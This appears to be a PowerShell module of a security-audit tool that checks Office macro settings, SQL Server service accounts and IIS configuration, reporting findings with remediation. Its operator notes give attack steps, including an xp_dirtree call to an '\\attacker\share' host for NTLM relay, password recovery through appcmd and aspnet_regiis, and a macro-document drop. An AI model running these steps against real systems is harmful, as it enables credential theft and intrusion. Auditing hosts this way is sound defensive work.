#requires -Version 5.1


$ctx = $global:BR2.Context

# ======================================================================
# OFFICE
# ======================================================================

# Office install detection - look for common registry paths / exe
$officeInstalled = $false
$officeVersions = @()
foreach ($v in '16.0','15.0','14.0') {
    if (Test-Path "HKLM:\SOFTWARE\Microsoft\Office\$v\Common\InstallRoot") {
        $officeInstalled = $true
        $officeVersions += $v
    }
}
# check Click-to-Run state
$c2r = Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Office\ClickToRun\Configuration' -ErrorAction SilentlyContinue
if ($c2r) {
    $officeInstalled = $true
    $BR2.Raw.OfficeC2R = @{
        VersionToReport = $c2r.VersionToReport
        Channel         = $c2r.UpdateChannel
    }
}

if ($officeInstalled) {
    $BR2.Raw.Office = @{
        Versions = $officeVersions
    }

    # VBA macro warning level across apps
    $offApps = @('Word','Excel','PowerPoint','Outlook','Visio','Project','Access','Publisher')
    foreach ($v in $officeVersions) {
        foreach ($app in $offApps) {
            $secPath = "HKCU:\Software\Microsoft\Office\$v\$app\Security"
            if (-not (Test-Path $secPath)) { continue }

            $vbaWarnings = Get-RegistryValueSafe -Path $secPath -Name 'VBAWarnings'
            $blockCOM    = Get-RegistryValueSafe -Path $secPath -Name 'BlockContentExecutionFromInternet'
            $macroRuntime= Get-RegistryValueSafe -Path $secPath -Name 'MacroRuntimeScanScope'

            # VBAWarnings: 1 = enable all, 2 = disable with notification (default),
            # 3 = disable except digitally signed, 4 = disable all without notification
            if ($vbaWarnings -eq 1) {
                $BR2.Findings.Add( (New-Finding `
                    -CheckID "BR-OFFICE-010-$app" `
                    -Category 'ApplicationSecurity' `
                    -Title "Office $app VBAWarnings=1 (macros enabled without prompting)" `
                    -Severity 'High' `
                    -Exploitability 'High' `
                    -AttackPath 'Document with VBA macro opens and runs macro without user prompt - primary initial access vector' `
                    -MITRE 'T1204.002' `
                    -Evidence @{
                        Application = $app
                        VBAWarnings = 1
                    } `
                    -Remediation 'Set VBAWarnings=4 (disable all) or 3 (signed only) via Group Policy. Never set to 1 in enterprise.' `
                    -OperatorNotes 'Sent malicious document opens and immediately executes macro. No user interaction required beyond opening the file. Primary initial-access vector for phishing when present.' `
                    -References @()
                ))
            }

            # BlockContentExecutionFromInternet (macros from internet block, default on since 2022)
            if ($blockCOM -ne 1) {
                $BR2.Findings.Add( (New-Finding `
                    -CheckID "BR-OFFICE-011-$app" `
                    -Category 'ApplicationSecurity' `
                    -Title "Office $app not blocking macros from Internet (BlockContentExecutionFromInternet != 1)" `
                    -Severity 'High' `
                    -Exploitability 'High' `
                    -AttackPath 'Documents marked with Mark-of-the-Web can still execute macros' `
                    -MITRE 'T1204.002' `
                    -Evidence @{
                        Application = $app
                        Value       = $blockCOM
                    } `
                    -Remediation 'Set BlockContentExecutionFromInternet=1. Microsoft default-enabled this in 2022.' `
                    -OperatorNotes 'Bypass when on: ISO/IMG/VHD container removes MOTW. But if this registry flag is off, direct-download docm/xlsm macros still run. Confirm against MOTW presence on test doc.' `
                    -References @('https://learn.microsoft.com/en-us/deployoffice/security/internet-macros-blocked')
                ))
            }
        }

        # Outlook specific: OutlookSecureTempFolder writability / attachment rules
        # Skipped - requires per-user config analysis; rarely impactful

        # Trusted Locations check
        $tlPath = "HKCU:\Software\Microsoft\Office\$v\Word\Security\Trusted Locations"
        if (Test-Path $tlPath) {
            $locations = Get-ChildItem -Path $tlPath -ErrorAction SilentlyContinue
            $userWritable = @()
            foreach ($loc in $locations) {
                $locPathStr = Get-RegistryValueSafe -Path $loc.PSPath -Name 'Path'
                if (-not $locPathStr) { continue }
                # Expand
                $expanded = [Environment]::ExpandEnvironmentVariables($locPathStr)
                if (-not (Test-Path -LiteralPath $expanded)) { continue }
                # Test writable by current user
                try {
                    $testFile = Join-Path $expanded "_br2test_$([guid]::NewGuid().ToString('N')).tmp"
                    New-Item -Path $testFile -ItemType File -ErrorAction Stop | Out-Null
                    Remove-Item -Path $testFile -Force -ErrorAction SilentlyContinue
                    $userWritable += $expanded
                } catch {}
            }
            if ($userWritable.Count -gt 0) {
                $BR2.Findings.Add( (New-Finding `
                    -CheckID 'BR-OFFICE-020' `
                    -Category 'ApplicationSecurity' `
                    -Title "Office Trusted Locations include user-writable directories" `
                    -Severity 'High' `
                    -Exploitability 'High' `
                    -AttackPath 'Drop macro-enabled doc in user-writable trusted location - opens with macros auto-enabled regardless of global policy' `
                    -MITRE 'T1204.002' `
                    -Evidence @{ Locations = $userWritable } `
                    -Remediation 'Remove user-writable directories from trusted locations. Trusted locations should be admin-writable only.' `
                    -OperatorNotes 'Drop .docm into a writable trusted location (common pattern: C:\Temp, user profile). Trick user into opening - macros run without prompt even with VBAWarnings=2 (default).' `
                    -References @()
                ))
            }
        }
    }
}

# ======================================================================
# SQL SERVER
# ======================================================================

$sqlInstances = @()
try {
    $sqlInstances = Get-CimInstance -ClassName Win32_Service -Filter "Name like 'MSSQL$%' or Name='MSSQLSERVER'" -ErrorAction SilentlyContinue
} catch {}

if ($sqlInstances.Count -gt 0) {
    $BR2.Raw.SQLServer = @{
        InstanceCount = $sqlInstances.Count
        Instances     = @($sqlInstances | Select-Object Name, StartName, State)
    }

    foreach ($inst in $sqlInstances) {
        # Service account running as non-MSA/NS/LS is a yellow flag
        $startName = $inst.StartName
        if ($startName -and $startName -notmatch 'NT Service|LocalSystem|NETWORK SERVICE|LOCAL SERVICE|NT AUTHORITY') {
            $BR2.Findings.Add( (New-Finding `
                -CheckID 'BR-SQL-001' `
                -Category 'ApplicationSecurity' `
                -Title "SQL Server service '$($inst.Name)' runs as a domain account: $startName" `
                -Severity 'Medium' `
                -Exploitability 'High' `
                -AttackPath 'SQL impersonation via xp_dirtree / xp_fileexist coerces auth as the SQL service account' `
                -MITRE @('T1557.001','T1187') `
                -Evidence @{
                    Service   = $inst.Name
                    StartName = $startName
                } `
                -Remediation 'Use a gMSA for SQL service account. Restrict service account rights to minimum needed.' `
                -OperatorNotes 'Authenticated to SQL? EXEC xp_dirtree ''\\attacker\share'' coerces SQL service account NTLM auth to your listener. Relay to LDAPS for RBCD on target hosts, or to ADCS for ESC8. Also: if startName is a domain account with TRUSTED_FOR_DELEGATION, high-value target for unconstrained delegation abuse.' `
                -References @(
                    'https://www.netspi.com/blog/technical/network-penetration-testing/executing-smb-relay-attacks-via-sql-server-using-metasploit/',
                    'https://github.com/NetSPI/PowerUpSQL'
                )
            ))
        }
    }

    # SQL Browser service exposure (UDP 1434)
    $sqlBrowser = Get-Service -Name 'SQLBrowser' -ErrorAction SilentlyContinue
    if ($sqlBrowser -and $sqlBrowser.Status -eq 'Running') {
        $BR2.Findings.Add( (New-Finding `
            -CheckID 'BR-SQL-002' `
            -Category 'ApplicationSecurity' `
            -Title 'SQL Server Browser service (UDP 1434) running - instance enumeration' `
            -Severity 'Low' `
            -Exploitability 'Medium' `
            -AttackPath 'Remote instance enumeration without authentication - enables targeted auth attempts' `
            -MITRE 'T1046' `
            -Evidence @{ Status = 'Running' } `
            -Remediation 'Disable SQL Browser if using fixed ports. Or firewall UDP 1434 to management network only.' `
            -OperatorNotes 'Useful for recon from unauthenticated position. nmap -sU -p 1434 <target> --script ms-sql-info returns instance names, versions, and port numbers. Standard pre-phase for PowerUpSQL Get-SQLInstanceScanUDP.' `
            -References @()
        ))
    }
}

# ======================================================================
# IIS
# ======================================================================

$iisSvc = Get-Service -Name 'W3SVC' -ErrorAction SilentlyContinue
if ($iisSvc -and $iisSvc.Status -eq 'Running') {
    $BR2.Raw.IIS = @{
        ServiceState = "$($iisSvc.Status)"
    }

    # Check for common misconfigurations
    try {
        Import-Module WebAdministration -ErrorAction Stop
        $sites = Get-Website -ErrorAction SilentlyContinue
        $pools = Get-ChildItem -Path IIS:\AppPools -ErrorAction SilentlyContinue

        $BR2.Raw.IIS.Sites    = @($sites | Select-Object Name, State, PhysicalPath)
        $BR2.Raw.IIS.AppPools = @($pools | Select-Object Name, State, managedRuntimeVersion, @{n='Identity';e={$_.processModel.identityType}})

        # Sites with anonymous auth enabled
        foreach ($site in $sites) {
            $anonPath = "IIS:\Sites\$($site.Name)"
            try {
                $anonAuth = Get-WebConfigurationProperty -Location "$($site.Name)" -Filter "/system.webServer/security/authentication/anonymousAuthentication" -Name "enabled" -ErrorAction SilentlyContinue
                $winAuth = Get-WebConfigurationProperty -Location "$($site.Name)" -Filter "/system.webServer/security/authentication/windowsAuthentication" -Name "enabled" -ErrorAction SilentlyContinue
                $basicAuth = Get-WebConfigurationProperty -Location "$($site.Name)" -Filter "/system.webServer/security/authentication/basicAuthentication" -Name "enabled" -ErrorAction SilentlyContinue

                # Mixed anon + win auth is sometimes legitimate (public site landing + private app)
                # Flag Basic auth without HTTPS as a high finding
                if ($basicAuth -and $basicAuth.Value) {
                    # Does the site have an HTTPS binding?
                    $hasHttps = [bool]($site.Bindings.Collection | Where-Object { $_.protocol -eq 'https' })
                    if (-not $hasHttps) {
                        $BR2.Findings.Add( (New-Finding `
                            -CheckID "BR-IIS-001-$($site.Name)" `
                            -Category 'ApplicationSecurity' `
                            -Title "IIS site '$($site.Name)' uses Basic auth without HTTPS" `
                            -Severity 'High' `
                            -Exploitability 'High' `
                            -AttackPath 'Basic auth credentials sent base64-encoded in plaintext over HTTP' `
                            -MITRE 'T1040' `
                            -Evidence @{
                                Site      = $site.Name
                                BasicAuth = $true
                                HasHttps  = $false
                            } `
                            -Remediation 'Add HTTPS binding with valid cert and redirect HTTP. Or switch to Windows Auth.' `
                            -OperatorNotes 'Sniff HTTP traffic to this site. Basic auth exposes credentials to anyone in path.' `
                            -References @()
                        ))
                    }
                }
            } catch {}
        }

        # App pool identities with high privilege
        foreach ($pool in $pools) {
            $identity = "$($pool.processModel.identityType)"
            $userName = "$($pool.processModel.userName)"

            # LocalSystem is never right for an app pool
            if ($identity -eq 'LocalSystem') {
                $BR2.Findings.Add( (New-Finding `
                    -CheckID "BR-IIS-002-$($pool.Name)" `
                    -Category 'ApplicationSecurity' `
                    -Title "IIS app pool '$($pool.Name)' runs as LocalSystem" `
                    -Severity 'Critical' `
                    -Exploitability 'High' `
                    -AttackPath 'Web application vulnerability = instant SYSTEM on this host' `
                    -MITRE 'T1068' `
                    -Evidence @{
                        AppPool  = $pool.Name
                        Identity = $identity
                    } `
                    -Remediation 'Change app pool identity to ApplicationPoolIdentity. LocalSystem should not be an app pool identity.' `
                    -OperatorNotes 'Any command injection / deserialisation / path traversal bug in this web app yields SYSTEM. Potato family privesc not needed.' `
                    -References @()
                ))
            } elseif ($identity -eq 'SpecificUser' -and $userName -match '(Domain )?Admin') {
                $BR2.Findings.Add( (New-Finding `
                    -CheckID "BR-IIS-003-$($pool.Name)" `
                    -Category 'ApplicationSecurity' `
                    -Title "IIS app pool '$($pool.Name)' runs as admin-named account: $userName" `
                    -Severity 'Critical' `
                    -Exploitability 'High' `
                    -AttackPath 'Web app code execution yields admin-named account context - likely over-privileged' `
                    -MITRE 'T1078' `
                    -Evidence @{
                        AppPool  = $pool.Name
                        Identity = $identity
                        UserName = $userName
                    } `
                    -Remediation 'Review the service account privileges. Move to gMSA if domain account needed; otherwise ApplicationPoolIdentity.' `
                    -OperatorNotes 'appcmd list apppool /config:* | find "password" - encrypted password in applicationHost.config, but accessible via appcmd.exe or the built-in IIS cryptography modules if you have SYSTEM. Or coerce SQL-style auth via app pool service account.' `
                    -References @()
                ))
            }
        }
    } catch {}

    # web.config files with connection strings
    # This sweep is expensive - only do it if admin and IIS is confirmed
    if ($ctx.Elevated) {
        $inetpub = "$env:SystemDrive\inetpub\wwwroot"
        if (Test-Path $inetpub) {
            $webConfigs = Get-ChildItem -Path $inetpub -Recurse -Filter 'web.config' -ErrorAction SilentlyContinue -Force | Select-Object -First 50
            $configsWithCreds = @()
            foreach ($c in $webConfigs) {
                try {
                    $content = Get-Content $c.FullName -Raw -ErrorAction Stop
                    if ($content -match '(?i)<connectionStrings|password=|pwd=|integratedSecurity=False') {
                        $configsWithCreds += $c.FullName
                    }
                } catch {}
            }
            if ($configsWithCreds.Count -gt 0) {
                $BR2.Findings.Add( (New-Finding `
                    -CheckID 'BR-IIS-004' `
                    -Category 'ApplicationSecurity' `
                    -Title "IIS web.config files contain connection strings or credentials ($($configsWithCreds.Count) files)" `
                    -Severity 'High' `
                    -Exploitability 'High' `
                    -AttackPath 'web.config connection strings in plaintext - SQL auth, service accounts, API keys embedded' `
                    -MITRE 'T1552.001' `
                    -Evidence @{
                        Count = $configsWithCreds.Count
                        Files = @($configsWithCreds | Select-Object -First 5)
                    } `
                    -Remediation 'Encrypt connectionStrings sections via aspnet_regiis -pe. Use Windows Auth (integratedSecurity=True) where possible. Use Key Vault or Azure Managed Identity for cloud-hosted apps.' `
                    -OperatorNotes 'Even encrypted connectionStrings can be decrypted by aspnet_regiis -pd from the same host - DPAPI-level protection only. Plaintext is immediate recovery. SQL creds often domain accounts with broader access than the app needs.' `
                    -References @()
                ))
            }
        }
    }
}
